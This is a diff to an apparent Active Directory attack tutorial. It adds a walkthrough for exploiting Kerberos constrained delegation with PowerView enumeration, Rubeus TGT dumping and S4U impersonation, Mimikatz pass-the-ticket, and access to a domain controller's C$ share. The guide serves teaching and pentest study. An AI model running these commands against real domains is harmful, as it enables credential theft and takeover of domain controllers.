@@ -118,5 +118,49 @@ Due to problem in unconstrained delegation and emerging attaks microsoft release
 -  The web server computer will then use this **S4U2Proxy Ticket** to access CIFS server on behalf of the client.
 
 ## Problem with this architecture
-Since its sole responsibility of server configured with constrained delegation to request service ticket for configured service eg: cifs on behalf of a user, but the server doesnot check for which user. Meaning if we compromise a server with constrained delegation we can request service ticket for the configured service on behalf of any user. We can access the cifs service as domain administrator as well.
+Since its sole responsibility of server configured with constrained delegation to request service ticket for configured service eg: cifs on behalf of a user, but the server doesnot check for which user. Meaning if we compromise a server with constrained delegation we can request S4U2Self and S4U2Proxy ticket for the configured service on behalf of any user. We can access the cifs service as domain administrator as well.
 
+**Note:** Constrained delegation can be setup on both computer and service accounts.
+
+## Exploiting Constrained Delegation
+First find servers confgured with constrained delegation. We can use PowerView or ADSearch.exe in case of cobaltstrike. Below we are using PowerView.
+
+```powershell
+C:\Users\Alex> Get-DomainComputer -TrustedToAuth
+```
+```powershell
+C:\Users\Alex> Get-DomainUser -TrustedToAuth
+
+distinguishedname : CN=SQL-1,OU=Servers,DC=dev,DC=dhitalcorp,DC=local
+name              : SQL-1
+samaccountname    : SQL-1$
+operatingsystem   : Windows Server 2019 Datacenter
+allowedtodelegate : {cifs/dc.dev.dhitalcorp.local}
+```
+We can see above SQL-1$ computer is allowed to delegate cifs service on dc.dev.dhitalcorp.local that means we can access cifs service on dc.dev.dhitalcorp.local as any user. First we will need to dump TGT of SQL-1$ computer account using this we can perform s4u2self and 4u2proxy for cifs on dev.dhitalcorp.local using a single command.
+
+```powershell
+C:\Users\Alex> .\Rubeus.exe triage
+```
+```powershell
+C:\Users\Alex> .\Rubeus.exe dump /luid:0x2e5 /service:krbtgt /nowrap
+```
+```powershell
+C:\Users\Alex> .\Rubeus.exe s4u /impersonateuser:alex /msdsspn:cifs/dc.dev.dhitalcorp.local /user:sql-1$ /ticket:erPFKSBNer4HGMuSU8= /nowrap
+```
+Now, save the `S4U2Proxy` ticket to a file and pass the ticket using rubeus or mimikatz
+
+```powershell
+C:\Users\Alex> echo <base64ServiceTicket> > C:\Users\Alex\Desktop\ticket.kirbi
+C:\Tools\Mimikatz\mimikatz.exe
+mimikatz # sekurlsa::tickets /export
+mimikatz # kerberos::ptt C:\Users\Alex\Desktop\ticket.kirbi
+```
+Pass the ticket using Rubeus
+```powershell
+C:\Users\Alex> .\Rubeus.exe ptt /ticket:C:\Users\Alex\Desktop\ticket.kirbi
+```
+Access cifs on dev.dhitalcorp.local
+```powershell
+C:\Users\Alex> net use \\dc.dev.dhitalcorp.local\c$
+```
